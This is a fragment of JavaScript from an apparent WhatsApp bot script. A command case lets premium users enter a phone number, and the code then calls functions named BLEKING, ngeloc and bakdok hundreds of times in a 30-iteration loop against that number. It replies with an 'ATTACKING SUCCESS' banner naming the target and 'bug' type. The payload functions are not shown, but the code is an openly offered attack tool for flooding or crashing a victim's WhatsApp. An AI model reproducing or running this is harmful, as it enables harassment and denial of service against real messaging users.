await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
